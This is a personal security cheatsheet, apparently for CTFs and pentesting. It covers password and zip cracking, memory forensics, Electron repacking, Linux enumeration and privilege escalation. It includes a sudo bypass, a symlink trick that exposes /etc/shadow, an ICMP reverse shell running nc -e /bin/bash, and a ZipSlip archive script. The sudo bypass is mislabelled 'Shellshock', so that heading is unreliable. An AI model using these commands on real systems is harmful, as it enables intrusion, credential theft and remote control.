Title: Misc Cheatsheet
Slug: misc/cheatsheet
Date: 1957-01-01 00:00
Category: Cheatsheet

## Cracking & Bruteforcing

Cool tools to generate username wordlists:

- [UsGen](https://github.com/melmols/UsGen)
- [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
- [uwg](https://github.com/hac01/uwg/)

Crack salted SHA512 hash with john the ripper:

~~~
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)'
~~~

**Note**: hashes need to be formatted as `hash$salt`

Crack a zip archive:

~~~
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
~~~

## Forensics

### Volatility

Reference: https://blog.onfvp.com/post/volatility-cheatsheet/

True Crypt (vol2) info from memory dump:

~~~
vol2 --profile 'Win7SP1x86_23418' -f TrueSecrets.raw truecryptsummary
~~~

Search and dump files (vol3):

~~~
vol -f <mem dump> windows.filescan.FileScan

vol -f <mem dump> windows.dumpfiles.DumpFiles --physaddr <addr from prev command>
~~~

### Linux Processes

~~~
// -e trace= read or write events
// -xx = hex instead of ascii

strace [-e trace=<read|write>] [-xx] [-s <max string length>] -p <pid>
~~~

## Java

Create executable jar:

~~~
jar cvfe Payload.jar Payload *.class
~~~

## Javascript

### Electron

Extract packaged application:
~~~
npm install asar # if not installed
npx asar extract <app>.asar <destination>
~~~

Re-pack application:

~~~
npx asar pack <source> <app>.asar
~~~

Enable dev console in code:

~~~
win.webContents.openDevTools();
~~~

Setup proxy:

~~~
# Add in code
app.commandLine.appendSwitch('proxy-server','127.0.0.1:8080') # Set proxy
app.commandLine.appendSwitch('ignore-certificate-errors') # Do not validate proxy certificate

# Run from shelll
> electron . --proxy-server=127.0.0.1:8080 --ignore-certificate-errors 
~~~

## Linux

### Filesystem Enumeration

 Running command for current process:
 
~~~
/proc/self/cmdline
~~~

Environment variables for current process:

~~~
/proc/self/environ
~~~

| clear_refs   | Clears page referenced bits shown in smaps output                                                                           |
| ------------ | --------------------------------------------------------------------------------------------------------------------------- |
| cmdline      | Command line arguments                                                                                                      |
| cpu          | Current and last cpu in which it was executed (2.4)(smp)                                                                    |
| cwd          | Link to the current working directory                                                                                       |
| environ      | Values of environment variables                                                                                             |
| exe          | Link to the executable of this process                                                                                      |
| fd           | Directory, which contains all file descriptors                                                                              |
| maps         | Memory maps to executables and library files (2.4)                                                                          |
| mem          | Memory held by this process                                                                                                 |
| root         | Link to the root directory of this process                                                                                  |
| stat         | Process status                                                                                                              |
| statm        | Process memory status information                                                                                           |
| status       | Process status in human readable form                                                                                       |
| wchan        | Present with CONFIG_KALLSYMS=y: it shows the kernel function symbol the task is blocked in - or “0” if not blocked.         |
| pagemap      | Page table                                                                                                                  |
| stack        | Report full stack trace, enable via CONFIG_STACKTRACE                                                                       |
| smaps        | An extension based on maps, showing the memory consumption of each mapping and flags associated with it                     |
| smaps_rollup | Accumulated smaps stats for all mappings of the process. This can be derived from smaps, but is faster and more convenient  |
| numa_maps    | An extension based on maps, showing the memory locality and binding policy as well as mem usage (in pages) of each mapping. |

All available network interfaces:

~~~
/proc/net/arp
~~~

Network Interface Hardware address:

~~~
/sys/class/net/<if>/address
~~~

Having `root` privileges, it's possible to access the root filesystem `/` by mean of `/proc` as follows:

~~~
/proc/1/task/1/root
~~~

**Note**: this may be useful when achieving limited Path Traversal in containers 

References:

- [/proc Explained](https://docs.kernel.org/filesystems/proc.html) 
- [/sys/class explained](https://www.kernel.org/doc/Documentation/ABI/testing/sysfs-class-net)

### Filesystem Permissions

Directory permissions govern the ability to modify the directory contents, including deleting files within it. As the owner of the directory, you have the necessary permissions to modify its contents, which typically includes deleting files within that directory. 
This means you can delete the file regardless of whether you have specific permissions on that file.

However, there are some scenarios where this might not work, such as if the file has the "immutable" attribute set or if there are specific restrictions in place at a higher level (like filesystem-level permissions) that prevent modification or deletion of files within the directory.

### Privilege Escalation

#### Bash Script: Unsafe Arithmetic Expression

Unsafe arithmetic expression in bash script can lead to command injection and privilege escalation: [see there](https://dev.to/greymd/eq-can-be-critically-vulnerable-338m)

- A script using arithmetic mode can be susceptible to command injection by code variables when attacker has a way to provide malicious values

#### Shared Object Injection

Check for shared object injection entry points using strace. **strace** is a tool used to trace system calls and signals.

~~~
strace /usr/local/bin/<binary> 2>&1 | grep -iE "open|access|no such file"
~~~

#### Shellshock

CVE-2019-14287:

~~~
sudo -u#-1 /bin/bash
~~~

#### Sudo

- Always check if **secure_path** is set with *sudo -l*. If not, it's possible to alter PATH environment variable in order to exploit binaries with relative path.
- If the user has root privileges on some binary allowing to write/read file contents (es: sudoedit, nano, vim, cat, ...), it's possible to exfiltrate protected content using a symlink:

~~~
ES: (ALL, ALL) sudoedit /some/path/filename.txt

1. ln -s /etc/shadow /some/path/filename.txt
2. sudoedit /some/path/filename.txt
~~~

- If env_keep+=LD_PRELOAD and env_keep+=LD_LIBRARY_PATH are set, it's possible to compile some malicious code and replace dynamically loaded libraries used by a binary with sudo privileges.
	- Note: **LD_PRELOAD** loads a shared object before any others when a program is run. **LD_LIBRARY_PATH** provides a list of directories where shared libraries are searched for first.

~~~shell
// Get dynamic libraries for a binary
ldd bin
~~~
#### File and Permissions

Find files/directories with SUID set:

~~~shell
find / -type f -perm /4000 2> /dev/null
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -perm -u=s -type f 2>/dev/null
~~~

Find files/directories with GUID set:

~~~shell
find / -perm /2000 2> /dev/null
find / -perm -g=s -type f 2>/dev/null
~~~

Find all writable files and directories:

~~~shell
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
~~~

### Reverse Shells

Reverse shell though `hping3`:

~~~
Server: sudo /usr/sbin/hping3 --icmp --listen test -s 1234 192.168.56.108 | /bin/sh

Client: sudo hping3 --icmp -c 1 -E payload -d 512 -p 1234 -I eth1 192.168.56.108

Payload: dummymessagetestsudo nc.traditional -e /bin/bash '192.168.56.108' '8090'
~~~

 Upgrade shell to TTY when no python available (example: docker container):

~~~
SHELL=/bin/bash script -q /dev/null

stty raw -echo && fg
~~~

### Utils

Get a portion of a file:

~~~
file tail -c "$((0x7E8D6 + 1))" | head -c "$((0x8AD5D - 0x7E8D6))" >result
~~~

Delete a file which name starts with `--`:

~~~
rm -- --help
~~~

**Note**: `--` makes `rm` stop parsing command line options 
## Python Utils

Use pdb debugger ([pdb](https://docs.python.org/3/library/pdb.html)):

~~~
python -m pdb myscript.py
~~~


Zipslip script:

~~~python
import io
import zipfile

zip_buffer = io.BytesIO()
trav = "../plugins/"
with open('plugin.js', 'r') as f:
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr(trav+'plugin.js', "\n".join(f.readlines()))

    output = zip_buffer.getvalue()


with open('output.zip', 'wb') as f:
 f.write(output)
~~~


## Scripting Utilities

### Bash
Clear line in console output:

~~~
echo -en "\033[2K\r$domain"
~~~

Filter string by specified length range:

~~~
echo 123 | awk 'length >= 3 && length <= 32'
~~~

`wget` usage useful when missing `curl`:

~~~
// -q = quiet
// -O - = output to stdout

wget -q -O - <target>
~~~

## Windows

Enable system proxy from `regedit`:

![[windows-proxy-from-registers.png]]

### cmd

Recursively search for directory or files:

~~~
dir /s foo*
~~~

Stop and (re)start service:

~~~
sc <stop, start> <servicename>
~~~

Add (persistent with flag `-P`) route:

~~~cmd
route -P ADD <subnet> MASK <netmask> <gateway> METRIC <value>
~~~

## Proxmox

- How to import OVA into Proxmox: [here](https://i12bretro.github.io/tutorials/0387.html).
- How to import VMDK (VMWare) into Proxmox: [here](https://pve.proxmox.com/wiki/Migrate_to_Proxmox_VE#Manual_Migration).